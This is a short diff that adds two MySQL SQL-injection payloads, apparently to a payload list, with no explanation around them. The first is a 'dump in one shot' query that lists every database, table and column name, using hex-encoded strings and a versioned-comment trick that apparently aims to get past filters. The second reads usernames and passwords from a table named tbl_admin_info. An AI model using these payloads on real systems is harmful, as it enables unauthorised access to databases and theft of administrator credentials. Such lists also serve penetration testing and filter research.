@@ -1,0 +1,3 @@
+(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=/*!50000concat*/(@x,0x3c62723e,table_schema,0x272d2d3e27,table_name,0x272d2d3e27,column_name))))x)
+ 
+(select (@) from (select (@:=0x00), (select (@) from tbl_admin_info where (@) in (@:=/*!50000concat*/(@,user_name,0x3a,password))))a)
